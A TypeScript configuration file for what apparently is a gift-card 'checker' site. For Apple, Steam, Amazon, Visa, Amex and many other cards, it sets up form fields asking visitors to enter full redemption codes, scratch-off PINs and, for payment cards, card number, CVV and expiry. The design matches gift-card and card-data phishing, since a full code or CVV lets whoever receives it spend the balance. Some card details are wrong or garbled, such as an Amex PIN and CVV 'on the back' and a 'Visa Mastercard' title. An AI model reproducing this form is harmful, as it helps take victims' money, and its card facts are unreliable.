export interface WhereIsMyCodeData {
  headerText: string;
  scratchLabel?: string;
  sampleCode: string;
  theme: 'apple' | 'steam' | 'amazon' | 'razer' | 'visa-dual' | 'ebay' | 'amex' | 'sephora' | 'generic';
  footerTip: string;
  highlightWords?: string[];
}

export interface CardValidationRequirement {
  title?: string;
  codeLabel: string;
  codeLengthRule: string;
  codePlaceholder: string;
  codeHelperText: string;
  codeRegexDescription: string;
  scratchInstruction: string;
  
  // Field visibility flags
  pinRequired: boolean;
  pinLabel?: string;
  pinLength?: string;
  pinPlaceholder?: string;
  pinDescription?: string;

  cvvRequired?: boolean;
  cvvLabel?: string;
  cvvPlaceholder?: string;
  cvvLength?: string;

  expiryRequired?: boolean;

  hasWhereIsMyCode?: boolean;
  whereIsMyCode?: WhereIsMyCodeData;

  barcodeNotice?: string;
  quickCheckTips: string[];
}

export const BRAND_REQUIREMENTS: Record<string, CardValidationRequirement> = {
  apple: {
    title: 'Apple Gift Card Checker',
    codeLabel: 'Redemption Code',
    codeLengthRule: '16-character code starting with X',
    codePlaceholder: 'Enter 16 digit redemption code',
    codeHelperText: '16 characters starting with X',
    codeRegexDescription: '16 characters typically beginning with capital letter "X"',
    scratchInstruction: 'Ensure you take the card out of the packaging and scratch the silver coated area. You should see a code that begins with the letter X after scratching.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'Ensure you take the card out of the packaging and scratch the silver coated area.\nYou should see a code that begins with the letter X after scratching.',
      sampleCode: 'X6N1DTJ08K26FLT',
      scratchLabel: 'REDEMPTION CODE',
      theme: 'apple',
      footerTip: 'Your code starts with X. Enter it exactly as shown in the field above.'
    },
    quickCheckTips: [
      'Begins with "X" on modern unified Apple Gift Cards.',
      'Redeemable on App Store, Apple Music, iCloud, and Apple Store online.',
      'Do not share code with unknown callers or third-party sellers.'
    ]
  },
  'american-express': {
    title: 'Verify Your American Express Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '15 digits starting with 34 or 37',
    codePlaceholder: '15-digit card number',
    codeHelperText: '15-digit card number on the front — starts with 34 or 37',
    codeRegexDescription: '15 numerical digits formatted 4-6-5',
    scratchInstruction: 'Locate the 15-digit card number on the front of your card, 4-digit PIN and 3-digit CVV on the back.',
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '4 digits',
    pinPlaceholder: '4-digit PIN',
    pinDescription: '4-digit PIN found on the back of the card.',
    cvvRequired: true,
    cvvLabel: 'CVV',
    cvvLength: '3 digits',
    cvvPlaceholder: '3-digit CVV',
    expiryRequired: true,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 15-digit number is on the front of your card.\nThe 4-digit PIN and 3-digit CVV are on the back.',
      sampleCode: '3759 876543 21001',
      scratchLabel: 'CARD NUMBER',
      theme: 'amex',
      footerTip: 'Enter the 15-digit number from the front, 4-digit PIN, and 3-digit CVV from the back.'
    },
    quickCheckTips: [
      'Amex cards strictly utilize 15 digits instead of 16.',
      'CVV and expiration date are required for balance verification.'
    ]
  },
  sephora: {
    title: 'Verify Your Sephora Card',
    codeLabel: 'Card Number',
    codeLengthRule: '16 digits located on card back',
    codePlaceholder: '6130 9051 2771 8355',
    codeHelperText: '16-digit card number on back',
    codeRegexDescription: '16 numerical digits',
    scratchInstruction: 'Scratch the wavy silver foil box on the back of the Sephora card next to CARD# to reveal the 8-digit security PIN.',
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '8 digits',
    pinPlaceholder: '8-digit PIN',
    pinDescription: '8-digit numerical PIN located directly under the scratch strip.',
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 16-digit card number is printed on the back of your Sephora card.\nScratch the silver wavy panel labeled PIN to reveal your 8-digit code.',
      sampleCode: '6130905127718355',
      scratchLabel: 'CARD# & PIN',
      theme: 'sephora',
      footerTip: 'Enter the 16-digit CARD# and the 8-digit PIN found under the scratch foil.'
    },
    quickCheckTips: [
      'Both the 16-digit card number and 8-digit PIN are required.',
      'Usable in-store, on Sephora.com, and in the Sephora app.'
    ]
  },
  steam: {
    title: 'Verify Your Steam Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '15 alphanumeric characters (formatted 5x5x5)',
    codePlaceholder: 'Enter 15 digit redemption code',
    codeHelperText: '15 characters in 3 groups of 5',
    codeRegexDescription: '3 groups of 5 characters separated by hyphens',
    scratchInstruction: 'The wallet code is on the back of your Steam Gift Card. Scratch the teal area labeled PIN to reveal your 15-character code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The wallet code is on the back of your Steam Gift Card.\nScratch the teal area labeled PIN to reveal your 15-character code.',
      sampleCode: 'EYNJV-***RR-9B2F6',
      scratchLabel: 'PIN',
      theme: 'steam',
      footerTip: 'Enter your code in the format XXXXX-XXXXX-XXXXX.\nDashes are added automatically.'
    },
    quickCheckTips: [
      'Follows standard Steam 5x5x5 format (15 characters total).',
      'Never share your wallet code with anyone claiming to be Steam Support.',
      'Applied directly to your Steam Account Wallet.'
    ]
  },
  visa: {
    title: 'Verify Your Visa Gift Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '16-digit card number',
    codePlaceholder: '16-digit code',
    codeHelperText: '16-digit card number on the front',
    codeRegexDescription: '16 numeric digits starting with 4',
    scratchInstruction: 'Locate the 16-digit card number on the front and 3-digit CVV on the back.',
    pinRequired: false,
    cvvRequired: true,
    cvvLabel: 'CVV',
    cvvLength: '3 digits',
    cvvPlaceholder: '3-digit CVV',
    expiryRequired: true,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 16-digit number is on the front of your card.\nThe 3-digit CVV is on the back in the signature strip.',
      sampleCode: '4097 5831 9185 1234',
      scratchLabel: 'CARD DETAILS',
      theme: 'visa-dual',
      footerTip: 'Enter the 16-digit number from the front and the 3-digit CVV from the back.'
    },
    quickCheckTips: [
      'Card must be activated by the cashier at point of purchase.',
      'CVV 3-digit code is required for online authorizations.',
      'Valid anywhere Visa debit cards are accepted.'
    ]
  },
  'visa-vanilla': {
    title: 'Verify Your Visa Vanilla Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '16 digits starting with 4',
    codePlaceholder: '16-digit code',
    codeHelperText: '16-digit card number on the front',
    codeRegexDescription: '16 numerical digits printed on the card',
    scratchInstruction: 'Peel open the secure packaging to reveal the 16-digit card number, valid expiration date, and 3-digit CVV on the back.',
    pinRequired: false,
    cvvRequired: true,
    cvvLabel: 'CVV',
    cvvLength: '3 digits',
    cvvPlaceholder: '3-digit CVV',
    expiryRequired: true,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 16-digit number is on the front of your card.\nThe 3-digit CVV is on the back in the signature strip.',
      sampleCode: '4147 2049 5820 1234',
      scratchLabel: 'CARD DETAILS',
      theme: 'visa-dual',
      footerTip: 'Enter the 16-digit number from the front and the 3-digit CVV from the back.'
    },
    quickCheckTips: [
      'Check that tamper-evident packaging seal was intact before purchase.',
      'Vanilla cards require CVV and expiration date for validation.'
    ]
  },
  mastercard: {
    title: 'Verify Your Visa Mastercard Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '16 digits starting with 5 (or 2)',
    codePlaceholder: '16-digit code',
    codeHelperText: '16-digit card number on the front',
    codeRegexDescription: '16 numeric digits',
    scratchInstruction: 'View the 16 digits on the card front, 3-digit CVC code on the back, and expiration date.',
    pinRequired: false,
    cvvRequired: true,
    cvvLabel: 'CVV',
    cvvLength: '3 digits',
    cvvPlaceholder: '3-digit CVV',
    expiryRequired: true,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 16-digit number is on the front of your card.\nThe 3-digit CVV is on the back in the signature strip.',
      sampleCode: '5412 8492 0194 1234',
      scratchLabel: 'CARD DETAILS',
      theme: 'visa-dual',
      footerTip: 'Enter the 16-digit number from the front and the 3-digit CVV from the back.'
    },
    quickCheckTips: [
      'Requires initial cashier activation at the cash register.',
      'Accepted online and in stores worldwide where Debit Mastercard is taken.'
    ]
  },
  ebay: {
    title: 'Verify Your eBay Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: 'Exact 13-digit alphanumeric code',
    codePlaceholder: 'Enter 13 digit redemption code',
    codeHelperText: '13-digit code — no PIN required',
    codeRegexDescription: '13 characters without spaces or dashes',
    scratchInstruction: 'Gently scratch off the metallic silver security panel on the back of your eBay card to reveal the 13-digit redemption code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 13-digit redemption code is on the back of your eBay card.\nScratch the silver coating to reveal your code.',
      sampleCode: '9482 1049 82013',
      scratchLabel: 'REDEMPTION CODE',
      theme: 'ebay',
      footerTip: 'Enter your 13-digit code exactly as shown — no dashes or spaces needed.'
    },
    quickCheckTips: [
      'Must be redeemed at eBay checkout or added to your balance.',
      'Check that all 13 digits are readable.'
    ]
  },
  amazon: {
    title: 'Verify Your Amazon Card',
    codeLabel: 'Claim Code',
    codeLengthRule: '14 to 15-character claim code',
    codePlaceholder: 'XXXX-XXXXXX-XXXX',
    codeHelperText: '14-15 characters — letters & numbers',
    codeRegexDescription: 'Contains dashes or unbroken alphanumeric strings',
    scratchInstruction: 'Your claim code is on the back of the card or in your order email. Scratch the grey area to reveal the 14-15 character code of letters and numbers.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'Your claim code is on the back of the card or in your order email.\nScratch the grey area to reveal the 14-15 character code of letters and numbers.',
      sampleCode: 'A2X4-***4YP-RNQ1',
      scratchLabel: 'CLAIM CODE',
      theme: 'amazon',
      footerTip: 'Enter your 14-15 character claim code — dashes are added automatically'
    },
    quickCheckTips: [
      'Claim codes are NOT the 16-digit card serial number.',
      'Amazon gift cards do not require a separate PIN.'
    ]
  },
  playstation: {
    title: 'Verify Your PlayStation Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '10 or 12 alphanumeric characters',
    codePlaceholder: 'Enter 10 or 12 digit redemption code',
    codeHelperText: '10 or 12-digit code — no PIN required',
    codeRegexDescription: '10 or 12 characters divided into blocks',
    scratchInstruction: 'Scratch the protective foil panel on the back of the voucher card to expose the redemption key.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The redemption code is on the back of your PlayStation card.\nScratch off the silver panel to reveal the 10 or 12-digit code.',
      sampleCode: 'TX84-3019-9482',
      scratchLabel: 'VOUCHER CODE',
      theme: 'generic',
      footerTip: 'Enter your 10 or 12-digit code — dashes are added automatically.'
    },
    quickCheckTips: [
      'Must match your PlayStation Network account region.',
      'Voucher codes are strictly 10 or 12 digits/letters.'
    ]
  },
  macys: {
    title: "Verify Your Macy's Card",
    codeLabel: 'Card Number',
    codeLengthRule: '12 to 16 numerical digits',
    codePlaceholder: '1234 5678 9012',
    codeHelperText: '12-digit card number',
    codeRegexDescription: '12-16 numeric characters',
    scratchInstruction: "Scratch off the CID panel on the back of the Macy's card to reveal the 4-digit Security CID/PIN.",
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '4 digits',
    pinPlaceholder: '4-digit PIN',
    pinDescription: 'Printed inside the scratch-off field labeled CID / PIN.',
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: "The card number is printed on the back.\nScratch off the silver panel to reveal your 4-digit PIN.",
      sampleCode: '1234 5678 9012',
      scratchLabel: 'CARD NUMBER & PIN',
      theme: 'generic',
      footerTip: "Enter the 12-digit card number and the 4-digit PIN."
    },
    quickCheckTips: [
      'CID security number is mandatory for balance verification.'
    ]
  },
  nordstrom: {
    title: 'Verify Your Nordstrom Card',
    codeLabel: 'Card Number',
    codeLengthRule: '16 numerical digits',
    codePlaceholder: '16-digit card number',
    codeHelperText: '16-digit card number on back of card',
    codeRegexDescription: '16 numerical digits on back of card',
    scratchInstruction: 'Gently scratch off the metallic panel on the back of the card to reveal the 4-digit access number / PIN.',
    pinRequired: true,
    pinLabel: 'Access Number / PIN',
    pinLength: '4 digits',
    pinPlaceholder: '4-digit PIN',
    pinDescription: 'Located under the scratch area next to the card number.',
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The 16-digit card number is on the back of your Nordstrom card.\nScratch the foil to reveal your 4-digit PIN.',
      sampleCode: '8492 0194 5820 9104',
      scratchLabel: 'CARD NUMBER & PIN',
      theme: 'generic',
      footerTip: 'Enter the 16-digit number and 4-digit access PIN.'
    },
    quickCheckTips: [
      '4-digit access number is required for balance lookup.'
    ]
  },
  'razer-gold': {
    title: 'Verify Your Razer Gold Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '14-digit redemption code',
    codePlaceholder: 'Enter 14 digit redemption code',
    codeHelperText: '14-digit card number — no PIN required',
    codeRegexDescription: '14 alphanumeric characters',
    scratchInstruction: 'The PIN/Voucher Code is on the back of your Razer Gold card. Scratch the green area to reveal your 14-digit code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'The PIN/Voucher Code is on the back of your Razer Gold card.\nScratch the green area to reveal your 14-digit code.',
      sampleCode: '3254 ***09 05978',
      scratchLabel: 'PIN / VOUCHER CODE',
      theme: 'razer',
      footerTip: 'Enter your 14-digit code exactly as shown — no dashes or spaces needed.'
    },
    quickCheckTips: [
      'Enter the full 14-character PIN code found under the green scratch coating.',
      'No secondary PIN is required.'
    ]
  },
  'foot-locker': {
    title: 'Verify Your Foot Locker Card',
    codeLabel: 'Card Number',
    codeLengthRule: '16 numerical digits',
    codePlaceholder: 'FTLK-4820-1940-5829',
    codeHelperText: '16 numerical digits on card back',
    codeRegexDescription: '16 numeric characters',
    scratchInstruction: 'Scratch the gray foil on the back of the Foot Locker card to reveal the 8-digit PIN.',
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '8 digits',
    pinPlaceholder: '8-digit PIN',
    pinDescription: '8-digit security PIN situated under the scratch off.',
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Both the 16-digit card number and 8-digit PIN are required.'
    ]
  },
  xbox: {
    title: 'Verify Your Xbox Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '25 alphanumeric characters (formatted 5x5)',
    codePlaceholder: 'Enter 25 digit digital code',
    codeHelperText: '25 characters — no PIN required',
    codeRegexDescription: '25 characters in 5 blocks of 5',
    scratchInstruction: 'Gently scratch the silver security panel on the back of the Xbox card to uncover the 25-character digital redemption token.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'Scratch the silver panel on the back of your Xbox gift card to reveal the 25-character code.',
      sampleCode: 'XBX74-92940-29481-KL849-01948',
      scratchLabel: 'DIGITAL CODE',
      theme: 'generic',
      footerTip: 'Xbox codes always contain exactly 25 characters.'
    },
    quickCheckTips: [
      'Microsoft & Xbox codes always contain exactly 25 characters.'
    ]
  },
  'google-play': {
    title: 'Verify Your Google Play Card',
    codeLabel: 'Redemption Code',
    codeLengthRule: '16 alphanumeric characters',
    codePlaceholder: 'Enter 16 digit redemption code',
    codeHelperText: '16 alphanumeric characters — no PIN required',
    codeRegexDescription: '16 characters (letters and numbers)',
    scratchInstruction: 'Scratch or peel off the metallic coating on the back of the card to reveal the 16-digit redemption code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    hasWhereIsMyCode: true,
    whereIsMyCode: {
      headerText: 'Gently scratch the silver panel on the back of your Google Play card to reveal the 16-digit code.',
      sampleCode: 'GPLY 8492 0194 5820',
      scratchLabel: 'GIFT CODE',
      theme: 'generic',
      footerTip: 'Redeemable in Google Play Store app or play.google.com/redeem.'
    },
    quickCheckTips: [
      'No separate PIN needed for Google Play cards.'
    ]
  },
  doordash: {
    title: 'Verify Your DoorDash Card',
    codeLabel: 'PIN Code',
    codeLengthRule: '11-16 characters',
    codePlaceholder: 'Enter DoorDash PIN / code',
    codeHelperText: '11 to 16 alphanumeric characters — no extra PIN required',
    codeRegexDescription: 'Alphanumeric claim PIN',
    scratchInstruction: 'Scratch off the silver scratch box on the back of the DoorDash gift card to reveal the redemption PIN.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Applied as DoorDash account credits for food delivery & pickup.'
    ]
  },
  target: {
    title: 'Verify Your Target GiftCard',
    codeLabel: 'Card Number',
    codeLengthRule: '15 digits starting with 0',
    codePlaceholder: '08491 0394 8291 049',
    codeHelperText: '15 numerical digits on back of card',
    codeRegexDescription: '15 numerical digits',
    scratchInstruction: 'Gently scratch off the silver strip on the back of the Target card to reveal the 8-digit Access Number / PIN.',
    pinRequired: true,
    pinLabel: 'Access Number / PIN',
    pinLength: '8 digits',
    pinPlaceholder: '8-digit Access Number',
    pinDescription: '8-digit numerical code located under the scratch strip.',
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Both 15-digit number and 8-digit Access Number are required.'
    ]
  },
  nike: {
    title: 'Verify Your Nike Gift Card',
    codeLabel: 'Card Number',
    codeLengthRule: '16 numerical digits',
    codePlaceholder: '5849 2049 1940 8201',
    codeHelperText: '16 numerical digits on back of card',
    codeRegexDescription: '16 digits on the back of the card',
    scratchInstruction: 'Scratch the protective security box on the back of the card to reveal the 6-digit PIN number.',
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '6 digits',
    pinPlaceholder: '6-digit PIN',
    pinDescription: '6 digits located under the scratch-off field.',
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Requires 6-digit PIN for checkout and validation.'
    ]
  },
  starbucks: {
    title: 'Verify Your Starbucks Card',
    codeLabel: 'Card Number',
    codeLengthRule: '16 numerical digits (starts with 608)',
    codePlaceholder: '6084 8492 1049 5820',
    codeHelperText: '16-digit card number starting with 608',
    codeRegexDescription: '16 digits beginning with 6',
    scratchInstruction: 'Gently scratch the silver coating on the back of the Starbucks card to uncover the 8-digit Security Code (CSC / PIN).',
    pinRequired: true,
    pinLabel: 'Security Code (CSC / PIN)',
    pinLength: '8 digits',
    pinPlaceholder: '8-digit CSC',
    pinDescription: '8-digit CSC number under the scratch panel.',
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Requires the 8-digit CSC for online balance queries and transfers.'
    ]
  },
  netflix: {
    title: 'Verify Your Netflix Card',
    codeLabel: 'Redemption PIN',
    codeLengthRule: '11 numerical digits',
    codePlaceholder: 'Enter 11-digit PIN',
    codeHelperText: '11 numerical digits under scratch foil — no separate PIN',
    codeRegexDescription: '11 digits without spaces',
    scratchInstruction: 'Gently scratch off the silver foil layer on the back of the card with a coin to reveal the 11-digit PIN code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Enter the 11-digit PIN at netflix.com/redeem.'
    ]
  },
  spotify: {
    title: 'Verify Your Spotify Card',
    codeLabel: 'Premium Code / PIN',
    codeLengthRule: '16-digit alphanumeric code',
    codePlaceholder: 'Enter Spotify premium code',
    codeHelperText: '16 characters — no separate PIN',
    codeRegexDescription: '16 characters found on the physical card back or electronic voucher',
    scratchInstruction: 'Gently scratch off the PIN cover on the back of the card to reveal the 16-digit redemption code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Redeemable at spotify.com/redeem for Individual Premium plans.'
    ]
  },
  airbnb: {
    title: 'Verify Your Airbnb Card',
    codeLabel: 'Card Number',
    codeLengthRule: '16 alphanumeric digits',
    codePlaceholder: 'Enter 16-character Airbnb code',
    codeHelperText: '16 alphanumeric characters on card back',
    codeRegexDescription: '16 alphanumeric characters',
    scratchInstruction: 'Scratch off the security covering on the back of your card to reveal the 16-digit card number and PIN.',
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '4-6 digits',
    pinPlaceholder: 'PIN Number',
    pinDescription: 'PIN located under the scratch panel.',
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Redeemable at airbnb.com/gift for stays and experiences.'
    ]
  },
  'uber-eats': {
    title: 'Verify Your Uber Eats Card',
    codeLabel: 'Gift Code',
    codeLengthRule: '16 alphanumeric characters',
    codePlaceholder: 'Enter 16-digit Uber claim code',
    codeHelperText: '16 characters on card back — no separate PIN',
    codeRegexDescription: '16 characters on card back',
    scratchInstruction: 'Scratch off the silver panel on the back of the card to uncover the claim code for Uber & Uber Eats.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Valid for both Uber rides and Uber Eats food deliveries.'
    ]
  },
  roblox: {
    title: 'Verify Your Roblox Card',
    codeLabel: 'Roblox PIN',
    codeLengthRule: '10 to 16-character Roblox PIN',
    codePlaceholder: 'Enter Roblox PIN code',
    codeHelperText: '10-16 alphanumeric characters under scratch strip — no separate PIN',
    codeRegexDescription: 'Alphanumeric code',
    scratchInstruction: 'Gently scratch the gray security strip on the back of the card to reveal the Roblox PIN code.',
    pinRequired: false,
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Redeem at roblox.com/redeem for Robux or Premium subscription.'
    ]
  }
};

export const getBrandRequirement = (brandId: string): CardValidationRequirement => {
  if (BRAND_REQUIREMENTS[brandId]) {
    return BRAND_REQUIREMENTS[brandId];
  }
  return {
    title: 'Gift Card Validator',
    codeLabel: 'Card Number / Code',
    codeLengthRule: '16-digit number or code on back of card',
    codePlaceholder: 'Enter card number or redemption code',
    codeHelperText: 'Card number or redemption code on card back',
    codeRegexDescription: 'Standard 16-digit or alphanumeric code',
    scratchInstruction: 'Gently scratch off the metallic security panel on the back of your card to reveal the full code.',
    pinRequired: true,
    pinLabel: 'PIN',
    pinLength: '3-8 digits',
    pinPlaceholder: 'PIN (if applicable)',
    pinDescription: 'Located under the scratch film or beside the barcode.',
    cvvRequired: false,
    expiryRequired: false,
    quickCheckTips: [
      'Check that card was activated at point of sale.',
      'Ensure all digits are clearly legible before submitting.'
    ]
  };
};
